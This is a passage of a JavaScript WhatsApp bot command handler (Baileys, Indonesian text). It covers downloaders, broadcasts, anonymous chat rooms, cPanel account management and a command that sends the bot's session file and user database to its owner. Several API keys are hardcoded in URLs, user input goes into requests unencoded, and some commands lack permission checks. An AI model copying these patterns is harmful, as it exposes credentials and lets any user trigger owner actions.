          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(funmenu(prefix, ad));
        }
        break;

      case "wallpapermenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(walpapermenu(prefix, ad));
        }
        break;

      case "animemenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(animemenu(prefix, ad));
        }
        break;

      case "cerpenmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(cerpenmenu(prefix, ad));
        }
        break;

      case "nsfwmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(nsfwmenu(prefix, ad));
        }
        break;

      case "soundmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(soundmenu(prefix, ad));
        }
        break;

      case "textpromenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(textpromenu(prefix, ad));
        }
        break;

      case "ephotomenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(ephotomenu(prefix, ad));
        }
        break;

      case "randomimagemenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(randomimagemenu(prefix, ad));
        }
        break;

      case "donate":
      case "donasi":
        {
          var monoSpace = "```";
          let cekName = `${cekUser("name", sender)}`;
          reply(donasiBot(cekName, ucapanWaktu));
        }
        break;
      case "infoowner":
      case "ownerinfo":
        {
          reply(infoOwner());
        }
        break;
      case "infogempa":
        fetchJson(`https://saipulanuar.ga/api/info/gempa?apikey=jPHjZpQF`).then(
          (xg) => {
            reply(`*INFO GEMPA*

*tanggal:* ${xg.result.tanggal}
*jam:* ${xg.result.jam}
*datetime:* ${xg.result.datetime}
*coordinates:* ${xg.result.coordinates}
*lintang:* ${xg.result.lintang}
*bujur:* ${xg.result.bujur}
*magnitude:* ${xg.result.magnitude}
*kedalaman:* ${xg.result.kedalaman}
*wilayah:* ${xg.result.wilayah}
*potensi:* ${xg.result.potensi}
*dirasakan:* ${xg.result.dirasakan}`);
          }
        );
        break;
      case "wikimedia":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) return reply("Contoh:\n#wikimedia viral");
          fetchJson(
            `https://saipulanuar.ga/api/search/wikimedia?query=${q}&apikey=jPHjZpQF`
          ).then((wk) => {
            var text_wikimedia = `*WIKIMEDIA SEARCH*
*title:* ${wk.result.title}
*source:* ${wk.result.source}
*author:* wikimedia`;
            conn.sendMessage(
              from,
              { image: { url: wk.result.image }, caption: text_wikimedia },
              { quoted: msg }
            );
          });
        }
        confirmlimit(sender, 1);
        break;
      case "joker":
      case "digital":
      case "nulis":
      case "nulis2":
      case "quoteser":
      case "quobucin":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) return reply(`Contoh:\n${prefix + command} saya bukan wibu`);
          reply(mess.wait);
          var buc = `https://saipulanuar.ga/api/textmaker/${command}?text=${q}&apikey=jPHjZpQF`;
          conn.sendMessage(
            from,
            { image: { url: buc }, caption: "Done!" },
            { quoted: msg }
          );
        }
        confirmlimit(sender, 1);
        break;
      case "attp2":
      case "attp":
      case "ttp2":
      case "ttp":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) return reply(`Contoh:\n${prefix + command} saya wibu`);
          var nyz1 = await getBuffer(
            `https://saipulanuar.ga/api/maker/${command}?text=${q}&apikey=jPHjZpQF`
          );
          fs.writeFileSync("getpp.jpeg", nyz1);
          await ffmpeg("getpp.jpeg")
            .input("getpp.jpeg")
            .on("error", function (error) {
              only("error", conn, from);
            })
            .on("end", function () {
              conn.sendMessage(from, {
                sticker: { url: "./getpp.webp" },
                mimetype: "image/webp",
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save("./getpp.webp");
          await sleep(5000);
          fs.unlinkSync("./getpp.jpeg");
          fs.unlinkSync("./getpp.webp");
        }
        confirmlimit(sender, 1);
        break;
      case "pinterest":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q) return reply(`Contoh:\n${prefix + command} loli`);
        reply(mess.wait);
        fetchJson(
          `https://saipulanuar.ga/api/search/pinterest?query=${q}&apikey=jPHjZpQF`
        ).then((pin) => {
          var media = pickRandom(pin.result);
          conn.sendMessage(
            from,
            { image: { url: media }, caption: `Done *${q}*` },
            { quoted: msg }
          );
        });
        confirmlimit(sender, 1);
        break;
      case "tts":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) return reply(`Contoh:\n${prefix + command} hallo bro`);
          var tts = `https://saipulanuar.ga/api/text-to-audio/tts?text=${q}&idbahasa=id&apikey=jPHjZpQF`;
          conn.sendMessage(
            sender,
            { audio: { url: tts }, mimetype: "audio/mpeg", ptt: true },
            { quoted: msg }
          );
        }
        confirmlimit(sender, 1);
        break;
      case "playmp3":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q) return reply("*Contoh:*\n#playmp3 preset angel baby 30 detik");
        fetchJson(
          `https://api-yogipw.herokuapp.com/api/yt/playmp3?query=${q}`
        ).then((z) => {
          var text_playmp3 = `*YOUTUBE PLAYMP3*

*title:* ${z.title}
*channel:* ${z.channel}
*published:* ${z.published}
*views:* ${z.views}
*type:* audio/mp3

Media sedang dikirim.`;
          reply(text_playmp3);
          conn.sendMessage(
            sender,
            {
              audio: { url: z.url },
              mimetype: "audio/mpeg",
              fileName: z.title + "mp3",
            },
            { quoted: msg }
          );
          if (isGroup) return reply("Media sudah dikirim dichat pribadi.");
        });
        confirmlimit(sender, 1);
        break;

      case "soundcloud":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q)
          return reply(
            "*Contoh:*\n#soundcloud https://soundcloud.com/ndaa-212683099/dj-coba-kau-ingat-ingat-kembali-seharusnya-aku-jungle-dutch-terbaru-2021-full-bass-viral-tik?utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing"
          );
        var yurl = q;
        reply(mess.wait);
        fetchJson(
          `https://saipulanuar.ga/api/download/soundcloud?url=${yurl}&apikey=jPHjZpQF`
        ).then((sdc) => {
          reply(`*SOUNDCLOUD DOWNLOAD*

*author:* Lexxy Official
*title:* ${sdc.result.title}
*duration:* ${sdc.result.duration}
*quality:* ${sdc.result.quality}

Audio sedang dikirim...

*Note:*
jika reply message status undefined
itu artinya url tidak ditemukan.`);
          conn.sendMessage(
            sender,
            {
              audio: { url: sdc.result.download },
              mimetype: "audio/mpeg",
              fileName: sdc.result.title + "mp3",
            },
            { quoted: msg }
          );
          if (isGroup) return reply("Audio sudah dikirim dichat pribadi.");
        });
        confirmlimit(sender, 1);
        break;

      case "playmp4":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q) return reply("*Contoh:*\n#playmp4 preset angel baby 30 detik");
        fetchJson(
          `https://api-yogipw.herokuapp.com/api/yt/playmp4?query=${q}`
        ).then((zz) => {
          var text_playmp4 = `*YOUTUBE PLAYMP4*

*title:* ${zz.title}
*channel:* ${zz.channel}
*published:* ${zz.published}
*views:* ${zz.views}
*type:* video/mp4

Media sedang dikirim.`;
          reply(text_playmp4);
          conn.sendMessage(
            sender,
            { video: { url: zz.url }, caption: "Done!" },
            { quoted: msg }
          );
          if (isGroup) return reply("Media sudah dikirim dichat pribadi.");
        });
        confirmlimit(sender, 1);
        break;

      case "mediafire":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q)
          return reply(
            "*Contoh:*\n#mediafire https://www.mediafire.com/file/451l493otr6zca4/V4.zip/file"
          );
        let isLinks = q.match(
          /(?:https?:\/{2})?(?:w{3}\.)?mediafire(?:com)?\.(?:com|be)(?:\/www\?v=|\/)([^\s&]+)/
        );
        if (!isLinks) return reply("Link yang kamu berikan tidak valid");
        reply("*Mengunduh Media...*");
        let baby1 = await mediafireDl(`${isLinks}`);
        if (baby1[0].size.split("MB")[0] >= 100)
          return reply("File Melebihi Batas " + util.format(baby1));
        let result4 = `-----[ *MEDIAFIRE DOWNLOADER* ]-----

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Type* : ${baby1[0].mime}

_Wait Mengirim file..._
`;
        reply(result4);
        if (isGroup)
          return reply("*document udah dikirim ke chat pribadi bot.*");
        conn
          .sendMessage(
            sender,
            {
              document: { url: baby1[0].link },
              fileName: baby1[0].nama,
              mimetype: baby1[0].mime,
            },
            { quoted: msg }
          )
          .catch((err) => reply("Gagal saat mendownload File"));
        confirmlimit(sender, 1);
        break;
      case "grupbot":
      case "groupbot":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        reply(`${setting.group.judul}
${setting.group.link}`);
        break;
      case "infobot":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        reply(`𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
• Author : @${ownerNumber.split("@")[0]}
• Owner : ${setting.ownerName}
• Botname : ${setting.botName}
• Library : Baileys-MD
• Time : ${jam} WIB
• Date : ${tanggal}
• Terdaftar : ( ${("id", db_user).length} )
• Room Chat : ( ${db_menfes.length} )`);
        break;
      case "ssweb-pc":
      case "ssweb-hp":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q)
            return reply(
              `Masukan parameter url\n*Contoh:*\n${
                prefix + command
              } https://google.com`
            );
          reply(mess.wait);
          let anu = `https://leyscoders-api.herokuapp.com/api/${command}?url=${q}&apikey=IkyOgiwara`;
          conn.sendMessage(
            from,
            { image: { url: anu }, caption: "Done!" },
            { quoted: msg }
          );
        }
        confirmlimit(sender, 1);
        break;
      case "setfooter":
        if (!isOwner) return reply(mess.OnlyOwner);
        if (!q)
          return reply(
            `Masukan parameter text\n*Contoh:*\n#setfooter ${setting.footer}`
          );
        setting.footer = q;
        fs.writeFileSync("./config.json", JSON.stringify(setting, null, 2));
        reply("Sukses mengganti footer");
        break;
      case "runtime":
      case "tes":
        if (!isOwner) return reply(mess.OnlyOwner);
        reply(`*Runtime :* ${runtime(process.uptime())}`);
        break;
      case "rules":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          let text_rules = `${rulesBot()}`;
          conn.sendMessage(from, { text: text_rules });
        }
        break;
      case "user":
      case "db":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          let xx_us = JSON.parse(fs.readFileSync("./database/pengguna.json"));
          let no = 1;
          let teks_db = `*INFO-DASHBOARD*

*• Terdaftar :* ( ${("id", db_user).length} )
*• Room Chat :* ( ${db_menfes.length} )\n\n`;
          for (let x of xx_us) {
            teks_db += `*User${no++} ${x.name}*\n*ID: @${
              x.id.split("@")[0]
            }*\n*Premium: ${x.premium ? "aktif" : "tidak"}*\n\n`;
          }
          reply(teks_db);
        }
        break;
      case "addprem":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q) return reply("*Contoh:*\n#addprem 628xxx");
          var number_one = q + "@s.whatsapp.net";
          if (cekUser("id", number_one) == null)
            return reply("User tersebut tidak terdaftar di database");
          if (cekUser("premium", number_one) == true)
            return reply("User tersebut sudah premium");
          setUser("±premium", number_one, true);
          reply(
            `*PREMIUM*\n*ID:* @${number_one.split("@")[0]}\n*Status:* aktif`
          );
        }
        break;
      case "delprem":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q) return reply("*Contoh:*\n#delprem 628xxx");
          var number_one = q + "@s.whatsapp.net";
          if (cekUser("id", number_one) == null)
            return reply("User tersebut tidak terdaftar di database");
          if (cekUser("premium", number_one) == false)
            return reply("User tersebut tidak premium");
          setUser("±premium", number_one, false);
          reply(
            `*PREMIUM*\n*ID:* @${number_one.split("@")[0]}\n*Status:* tidak`
          );
        }
        break;
      case "owner":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          var owner_Nya = setting.ownerNumber;
          sendContact(from, owner_Nya, setting.ownerName, msg);
          reply("Chat aja kak, ga usah malu");
        }
        break;
      case "room":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          var room = `*CHAT ANONYMOUS*\n\n*TOTAL ROOM : ${anonymous.length}*\n\n`;
          var no = 1;
          for (let x of anonymous) {
            room += `*ID ROOM ${x.id}*
*CHAT1: @${x.a.split("@")[0]}*
*CHAT2: @${x.b.split("@")[0]}*
*STATUS: ${x.state}*\n\n`;
          }
          reply(room);
        }
        break;
      case "daftarprem":
        mentions(
          `*Ingin Jadi Premium?*
*Silahkan Pilih Waktu Nya*

*List Harga*
Rp5.000 › 5day
Rp10.000 › 10day
Rp15.000 › 15day
Rp20.000 › 20day

*Dan Seterusnya...*
*day › hari*

*Keuntungan Premium*
- _Bisa Add Bot 1 Group_
- _Bisa Gunain Fitur Premium_

*Minat Jadi Premium?*
*Hubungi Owner*
@${setting.ChatOwner.split("@")[0]}`,
          [setting.ChatOwner]
        );
        break;
      case "sewabot":
        mentions(
          `*SEWA BOT*

*List Harga*
Rp3.000 › 5day
Rp5.000 › 10day
Rp7.000 › 15day
Rp10.000 › 20day
Rp15.000 › 30day

*day › hari*

*Keuntungan Sewabot*
- _Bisa Add Bot 1 Group_
- _Bisa Gunain Fitur Admin_

*Minat Sewabot?*
*Hubungi Owner*
@${setting.ChatOwner.split("@")[0]}`,
          [setting.ChatOwner]
        );
        break;
      case "cekprem":
        {
          mentions(
            `*CEK PREMIUM*
_• ID : @${cekUser("id", sender).split("@")[0]}_
_• Status : ${cekUser("premium", sender) ? "Aktif" : "Tidak"}_`,
            [sender]
          );
        }
        break;
      case "resetdb":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          let para_kos = "[]";
          db_user.splice(para_kos);
          fs.writeFileSync(
            "./database/pengguna.json",
            JSON.stringify(db_user, null, 1)
          );
          await sleep(1000);
          db_menfes.splice(para_kos);
          fs.writeFileSync(
            "./database/menfess.json",
            JSON.stringify(db_menfes, null, 1)
          );
          reply("Sukses restart database");
        }
        break;
      case "resetlist":
        db_respon_list.splice("[]");
        fs.writeFileSync(
          "./database/db_ListMessage",
          JSON.stringify(db_respon_list, null, 1)
        );
        reply("Sukses Reset List Message");
        break;
      // BROADCAST
      case "bctext":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Masukan parameter text\n*Contoh:*\n${prefix + command} hallo`
            );
          let db_orang = JSON.parse(
            fs.readFileSync("./database/pengguna.json")
          );
          let data_teks = `${q}`;
          for (let i of db_orang) {
            var button_broadcast = {
              text: data_teks,
              footer: "©broadcast",
              buttons: [
                {
                  buttonId: "!menu",
                  buttonText: { displayText: "⋮☰ 𝗠𝗘𝗡𝗨" },
                  type: 1,
                },
              ],
              headerType: 1,
            };
            conn.sendMessage(i.id, button_broadcast);
            await sleep(2000);
          }
          reply(`*Sukses mengirim broadcast text ke ${db_orang.length} user*`);
        }
        break;
      case "bcvideo":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (isVideo || isQuotedVideo) {
            await conn.downloadAndSaveMediaMessage(
              msg,
              "video",
              `./sticker/${sender.split("@")[0]}.mp4`
            );
            reply(mess.wait);
            var bc_video = `./sticker/${setting.ownerNumber.split("@")[0]}.mp4`;
            for (let i of db_user) {
              conn.sendMessage(i.id, {
                video: { url: bc_video },
                caption: "*©broadcast*",
              });
              await sleep(2000);
            }
            reply(
              `*Sukses mengirim broadcast video ke ${db_user.length} user*`
            );
            fs.unlinkSync(bc_video);
          } else {
            reply(
              `*kirim video dengan caption ${
                prefix + command
              } atau reply video dengan pesan ${prefix + command}*`
            );
          }
        }
        break;
      case "bcimage":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (isImage || isQuotedImage) {
            await conn.downloadAndSaveMediaMessage(
              msg,
              "image",
              `./sticker/${sender.split("@")[0]}.jpg`
            );
            reply(mess.wait);
            var bc_image = `./sticker/${setting.ownerNumber.split("@")[0]}.jpg`;
            for (let i of db_user) {
              conn.sendMessage(i.id, {
                image: { url: bc_image },
                caption: "*©broadcast*",
              });
              await sleep(2000);
            }
            reply(
              `*Sukses mengirim broadcast image ke ${db_user.length} user*`
            );
            fs.unlinkSync(bc_image);
          } else {
            reply(
              `*kirim gambar dengan caption ${
                prefix + command
              } atau reply gambar dengan pesan ${prefix + command}*`
            );
          }
        }
        break;
      case "bcaudio":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (isQuotedAudio) {
            await conn.downloadAndSaveMediaMessage(
              msg,
              "audio",
              `./sticker/${sender.split("@")[0]}.mp3`
            );
            reply(mess.wait);
            var bc_audio = `./sticker/${setting.ownerNumber.split("@")[0]}.mp3`;
            for (let i of db_user) {
              conn.sendMessage(i.id, {
                audio: { url: bc_audio },
                mimetype: "audio/mpeg",
                fileName: "bcaudio.mp3",
              });
              await sleep(2000);
            }
            reply(
              `*Sukses mengirim broadcast audio ke ${db_user.length} user*`
            );
            fs.unlinkSync(bc_audio);
          } else {
            reply(`*reply audio dengan pesan ${prefix + command}*`);
          }
        }
        break;
      case "bc":
      case "siaran":
      case "broadcast":
        if (!isOwner) return reply(mess.OnlyOwner);
        reply(`*BROADCAST*

*Type Text*
*Example:* 
#bctext <text>

*Type Audio*
*Example:*
#bcaudio <reply audio>

*Type Video*
*Example:*
#bcvideo <reply video>

*Type Image*
*Example:*
#bcimage <reply image>

_Broadcast › Chat All User_`);
        break;

      // OWNER ONLY
      case "setexif":
      case "setwm":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q) return reply("*Contoh:*\n#setwm pack|author");
          let nama_Pack = q.split("|")[0];
          let author_Pack = q.split("|")[1];
          if (!nama_Pack) return reply("*Contoh:*\n#setwm pack|author");
          if (!author_Pack) return reply("*Contoh:*\n#setwm pack|author");
          exif.create(nama_Pack, author_Pack);
          reply("Sukses membuat exif");
        }
        break;
      case "buat_room_chat":
        {
          var id_satu = q.split("|")[0];
          var id_dua = q.split("|")[1];
          var id_rom = q.split("|")[2];
          db_menfes.push({ id: id_satu, teman: id_dua });
          fs.writeFileSync(
            "./database/menfess.json",
            JSON.stringify(db_menfes, 2, null)
          );
          db_menfes.push({ id: id_dua, teman: id_satu });
          fs.writeFileSync(
            "./database/menfess.json",
            JSON.stringify(db_menfes, 2, null)
          );

          var tulis_pesan = `𝗖𝗵𝗮𝘁 𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀 𝗧𝗲𝗿𝗵𝘂𝗯𝘂𝗻𝗴✓
𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗞𝗶𝗿𝗶𝗺 𝗣𝗲𝘀𝗮𝗻✍

𝗸𝗲𝘁𝗶𝗸 #𝘀𝘁𝗼𝗽𝗰𝗵𝗮𝘁
𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 𝘀𝗲𝘀𝗶 𝗰𝗵𝗮𝘁

𝗡𝗼𝘁𝗲:
𝙧𝙤𝙤𝙢 𝙘𝙝𝙖𝙩 𝙞𝙣𝙞 𝙗𝙚𝙧𝙨𝙞𝙛𝙖𝙩 𝙖𝙣𝙤𝙣𝙞𝙢
𝙟𝙖𝙙𝙞 𝙠𝙖𝙢𝙪 𝙩𝙞𝙙𝙖𝙠 𝙩𝙖𝙪 𝙥𝙖𝙩𝙣𝙚𝙧𝙢𝙪
𝙠𝙚𝙘𝙪𝙖𝙡𝙞 𝙙𝙞𝙖 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 𝙣𝙖𝙢𝙖 𝙖𝙨𝙡𝙞
𝙖𝙩𝙖𝙪 𝙢𝙚𝙢𝙗𝙚𝙧𝙞𝙩𝙖𝙝𝙪𝙠𝙖𝙣 𝙞𝙣𝙛𝙤𝙧𝙢𝙖𝙨𝙞 𝙙𝙖𝙧𝙞𝙣𝙮𝙖.

𝘿𝙞𝙡𝙖𝙧𝙖𝙣𝙜 𝙨𝙥𝙖𝙢/𝙩𝙚𝙡𝙥𝙤𝙣 𝙗𝙤𝙩
𝙎𝙖𝙣𝙠𝙨𝙞 : 𝘽𝙡𝙤𝙠𝙞𝙧 𝙋𝙚𝙧𝙢𝙖𝙣𝙚𝙣

𝗥𝗼𝗼𝗺 𝗜𝗗 : ${id_rom}`;
          var buttonMessage = {
            text: tulis_pesan,
            footer: "klik button untuk menghapus sesi chat",
            buttons: [
              {
                buttonId: "#stopchat",
                buttonText: { displayText: "️⋮☰ 𝗦𝗧𝗢𝗣" },
                type: 1,
              },
            ],
            headerType: 1,
          };
          conn.sendMessage(id_satu, buttonMessage);
          conn.sendMessage(id_dua, buttonMessage);
        }
        break;
      case "stopchat":
        if (cekPesan("id", sender) == null)
          return reply(
            `Kamu sedang tidak didalam roomchat, Silahkan buat room dengan contoh dibawah ini.\n\n*Example:*\n#menfess num|nama|pes\n\n*Contoh:*\n#menfess 628xxx|bot|hai\n\n*Note:*\n6285789004732 - benar (✅)\n+62 857 8900 4732 - salah (❌)`
          );
        if (isGroup) return reply(mess.OnlyPM);
        var aku = sender;
        var dia = cekPesan("teman", aku);
        var teks_aku = `[✓] Berhasil memberhentikan chat`;
        setRoom("±id", dia, null);
        setRoom("±teman", dia, null);
        await sleep(2000);
        conn.sendMessage(aku, { text: teks_aku });
        setRoom("±id", aku, null);
        setRoom("±teman", aku, null);
        var teks_dia = `[✓] Room chat telah dihentikan\noleh teman chat kamu👤`;
        conn.sendMessage(dia, { text: teks_dia });
        db_menfes.splice("[]");
        fs.writeFileSync(
          "./database/menfess.json",
          JSON.stringify(db_menfes, null, 1)
        );
        break;
      case "secretchat":
      case "menfes":
      case "menfess":
        {
          if (cekPesan("id", sender) !== null)
            return reply(
              "Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat."
            );
          if (!q)
            return reply(
              `Format Fitur Menfess / Kirim pesan rahasia ke seseorang Lewat bot\n\n_*Example*_\n${
                prefix + command
              } wa|pengirim|pesan\n\n_*Contoh*_\n${
                prefix + command
              } 6285789004732|bot|hai\n\n*Note :*\nBerawal dari 628xxx tanpa spasi`
            );
          let num = q.split("|")[0];
          let nama_pengirim = q.split("|")[1];
          let pesan_teman = q.split("|")[2];
          var cekap = await conn.onWhatsApp(num + "@s.whatsapp.net");
          if (cekap.length == 0)
            return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`);
          let roomC = `#${makeid(10)}`;
          if (num == botNumber.split("@")[0]) return reply("Itu kan nomor bot");
          if (num == sender.split("@")[0])
            return reply("Menfes ke nomor sendiri:v\ncapek ya? semangat🗿");
          if (!num)
            return reply(
              `Harus di isi semua !!\nex : ${
                prefix + command
              } 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`
            );
          if (!nama_pengirim)
            return reply(
              `Harus di isi semua !!\nex : ${
                prefix + command
              } 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`
            );
          if (!pesan_teman)
            return reply(
              `Harus di isi semua !!\nex : ${
                prefix + command
              } 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`
            );
          let text_menfess = `*ANONYMOUS CHAT*\n_Hallo Kak ${ucapanWaktu}_\n_Ada pesan *Menfess/Rahasia*_\n\n*• Dari :* ${nama_pengirim}\n*• Pesan :* ${pesan_teman}\n\n_Pesan ini ditulis oleh seseorang_\n_Bot hanya menyampaikan saja._`;
          let btn_menfes = [
            {
              buttonId: `${prefix}buat_room_chat ${sender}|${num}@s.whatsapp.net|${roomC}`,
              buttonText: { displayText: "⋮☰ 𝗧𝗘𝗥𝗜𝗠𝗔" },
              type: 1,
            },
          ];
          var button_menfess = {
            text: text_menfess,
            footer: "Klik button untuk membalas chat.",
            buttons: btn_menfes,
            headerType: 1,
          };
          conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess);
          reply(
            "Pesan Menfess kamu sudah dikirim, Sedang menunggu untuk diterima."
          );
          if (isGroup) return reply("Pesan menfess kamu sudah dikirim.");
        }
        break;
      case "sc":
      case "script":
        {
          if (cekUser("id", sender) == null)
            return rconn.sendMessage(from, buta_menu);
          let text_buysc = `*_Mau beli scriptnya? harga murah kok._*

*Contact Person 📞*

*Admin:*
*Wa.me/628126915328*

_*Harga Normal :*_ ~Rp150.000~
*_Harga Promo : Rp100.000_*

_Sudah Termasuk Tutorial_
_Script Sudah Disusun Rapih_
_Size Script Sudah Ringan_
_Anti Ngelag - Anti Delay_
_Anti Spam - Anti Call_
_Total Fitur 600+_
_Topup & Deposit_`;
          conn.sendMessage(from, { text: text_buysc }, { quoted: msg });
        }
        break;
      case "request":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q)
            return reply(
              `Masukan parameter text\n*Contoh:*\n${
                prefix + command
              } Req fitur antilink bg`
            );
          var teks = `*| REQUEST FITUR |*`;
          var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`;
          var teks2 = `\n\nSucces send to owner`;
          var bg_lexxy = "628126915328@s.whatsapp.net";
          conn.sendMessage(
            bg_lexxy,
            { text: teks + teks1, mentions: [sender] },
            { quoted: msg }
          );
          conn.sendMessage(
            from,
            { text: teks + teks2 + teks1, mentions: [sender] },
            { quoted: msg }
          );
        }
        break;
      case "report":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q)
            return reply(
              `Masukan parameter text\n*Contoh:*\n${
                prefix + command
              } Fitur anu error bang`
            );
          var teks = `*| REPORT FITUR |*`;
          var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`;
          var teks2 = `\n\nSucces send to owner`;
          var bg_lexxy = "628126915328@s.whatsapp.net";
          conn.sendMessage(
            bg_lexxy,
            { text: teks + teks1, mentions: [sender] },
            { quoted: msg }
          );
          conn.sendMessage(
            from,
            { text: teks + teks2 + teks1, mentions: [sender] },
            { quoted: msg }
          );
        }
        break;
      case "createcp":
        if (!isOwner) return reply(mess.OnlyOwner);
        if (!q)
          return reply(
            `*CREATECP ACCOUNT*\nExample:\n#${command} domain|package\n\nContoh:\n#${command} lexxyapi.com|lexxy`
          );
        let usern = `USER${makeid(6)}`;
        let domain = q.split("|")[0];
        let pekeg = q.split("|")[1];
        if (!domain) return reply("Domain wajib di isi!!");
        if (!pekeg) return reply("Package Wajib di isi!!");
        reply("Creating please wait... ⏳");
        axios
          .get(
            `https://${hostwhm}:2087/json-api/createacct?api.version=1&username=${usern}&contactemail=lexxyofficial24@gmail.com&plan=${pekeg}&domain=${domain}`,
            authWhm
          )
          .then((response) => {
            let np = response.data;
            if (np.metadata.result == 0) {
              reply(np.metadata.reason);
            } else {
              let dsta = np.metadata.output.raw;
              var substr = dsta.substring(
                dsta.toString().indexOf("+===================================+")
              ); //substr = 'word. Hello!'
              let xxybot = substr.split("| Language: en")[0];
              reply(`${xxybot}\n\nLogin : https://${hostwhm}:2087`);
            }
          });
        break;
      case "listcp":
        if (!isOwner) return reply(mess.OnlyOwner);
        reply("Wait Getting List Account info....");
        axios
          .get(
            `https://${hostwhm}:2087/json-api/listaccts?api.version=1`,
            authWhm
          )
          .then((risol) => {
            let lisol = risol.data;
            var ttdy = lisol.data.acct;
            let ogh = `*── 「 LIST CPANEL 」 ──*\nTotal Akun : ${ttdy.length}\n`;
            for (let i = 0; i < ttdy.length; i++) {
              ogh += `
\n
─────[\`\`\` ${ttdy[i].user} \`\`\` ]────────
*▢ Maxsub* : ${ttdy[i].maxsub}
*▢ Maxsql* : ${ttdy[i].maxsql}
*▢ Startdate* : ${ttdy[i].startdate}
*▢ Disklimit* : ${ttdy[i].disklimit}
*▢ Maxlst* : ${ttdy[i].maxlst}
*▢ Plan* : ${ttdy[i].plan}
*▢ Owner*: ${ttdy[i].owner}
*▢ IP* : ${ttdy[i].ip}
*▢ Domain* : ${ttdy[i].domain}
*▢ Diskused* : ${ttdy[i].diskused}
*▢ Maxaddons* : ${ttdy[i].maxaddons}
*▢ Suspendreason* : ${ttdy[i].suspendreason}
─────────────────\n\n`;
            }
            reply(ogh);
          });
        break;
      case "terminate":
        if (!isOwner) return reply(mess.OnlyOwner);
        if (args.length < 2)
          return reply(`Kirim perintah #${command} username`);
        reply("Wait Terminating Account....");
        axios
          .get(
            `https://${hostwhm}:2087/json-api/removeacct?api.version=1&username=${args[1]}`,
            authWhm
          )
          .then((e) => {
            if ([1, "1"].includes(e.data?.metadata?.result))
              reply(`Done User ${q} Telah di Terminate`);
            else {
              reply(e.metadata);
              console.log(e.data);
            }
          });
        break;
      case "mysesi":
      case "sendsesi":
      case "session":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          reply("please wait..");
          await sleep(3000);

          // Read Database
          var user_bot = await fs.readFileSync("./database/pengguna.json");
          var sesi_bot = await fs.readFileSync(`./${setting.sessionName}.json`);

          // Sending Document
          conn.sendMessage(
            from,
            {
              document: sesi_bot,
              mimetype: "document/application",
              fileName: "session.json",
            },
            { quoted: msg }
          );
          conn.sendMessage(
            from,
            {
              document: user_bot,
              mimetype: "document/application",
              fileName: "pengguna.json",
            },
            { quoted: msg }
          );
        }
        break;
      // CASE BY LEXXY OFFICIAL
      // JANGAN DI EDIT LAGI YA
      case "pricelist":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let feta = await fetchJson(
